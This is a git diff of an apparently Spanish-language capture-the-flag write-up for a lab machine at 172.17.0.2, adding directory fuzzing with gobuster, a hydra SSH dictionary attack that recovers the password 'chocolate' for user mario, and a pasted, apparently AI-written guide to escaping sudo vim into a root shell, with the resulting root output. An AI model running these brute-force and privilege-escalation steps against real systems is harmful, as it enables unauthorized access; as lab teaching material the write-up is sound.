@@ -2,7 +2,7 @@
 
 **IP**: 172.17.0.2
 
-## Fase de Reconocimiento
+## Fase de comprobación de conectividad
 
 ### 1. Ping
 - La máquina responde correctamente:
@@ -17,6 +17,8 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 --- 172.17.0.2 ping statistics ---
 4 packets transmitted, 4 received, 0% packet loss, time 3061ms
 rtt min/avg/max/mdev = 0.069/0.091/0.133/0.024 ms
+
+![imagen de la máquina desplegada](assets/trust_1.png)
 
 ###   Fase 1: Reconocimiento
 1. Escaneo básico con Nmap
@@ -219,6 +221,8 @@ Ejecuta el siguiente comando:
 
 bash
 Copy
+### Fuzzing
+Hacemos fuzzing al puerto 80 para ver si cuelga algun directorio o archivo de la raiz. 
 
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.py
 
@@ -332,20 +336,100 @@ curl http://172.17.0.2/secret.php
 </html>
 
 ### Próximos pasos
-┌──(pol㉿kali)-[/usr/share/seclists]
-└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra
+Utilizamos hydra para hacer un ataque de diccionario por SSH.
+
+┌──(root㉿kali)-[/home/pol]
+└─# hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-06 19:38:14
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 10:14:25
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
 [22][ssh] host: 172.17.0.2   login: mario   password: chocolate
 1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 3 final worker threads did not complete until end.
-[ERROR] 3 targets did not resolve or could not be connected
+[WARNING] Writing restore file because 21 final worker threads did not complete until end.
+[ERROR] 21 targets did not resolve or could not be connected
 [ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-06 19:38:24
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-08 10:14:36
+
+# mario@9de2e1532c9a:~$ find / -perm -4000 2>/dev/null
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+
+# mario@9de2e1532c9a:~$ sudo -l
+[sudo] password for mario: 
+Matching Defaults entries for mario on 9de2e1532c9a:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User mario may run the following commands on 9de2e1532c9a:
+    (ALL) /usr/bin/vim
+
+No hay problema, te guío paso a paso en Vim para que puedas escalar privilegios correctamente.
+
+Pasos detallados:
+Ejecuta Vim como root
+En la terminal, escribe:
+
+bash
+Copiar
+Editar
+sudo vim
+Esto abrirá Vim con privilegios de root.
+
+Entra en modo de comandos
+Presiona la tecla ESC para asegurarte de estar en modo normal.
+
+Configura Vim para ejecutar una shell
+Escribe lo siguiente y presiona Enter después de cada línea:
+
+bash
+Copiar
+Editar
+:set shell=/bin/sh
+ruby
+Copiar
+Editar
+:shell
+Obtendrás una shell como root
+Ahora deberías tener acceso a una shell interactiva con privilegios elevados. Verifícalo ejecutando:
+
+bash
+Copiar
+Editar
+whoami
+id
+¿Cómo salir de Vim si algo falla?
+Si necesitas salir sin ejecutar la shell, puedes escribir:
+
+less
+Copiar
+Editar
+:q!
+y presionar Enter.
+
+Prueba estos pasos y dime si lograste obtener acceso como root. 🚀
+
+mario@9de2e1532c9a:~$ sudo vim
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# hosname
+/bin/sh: 3: hosname: not found
+# 
 
 
 
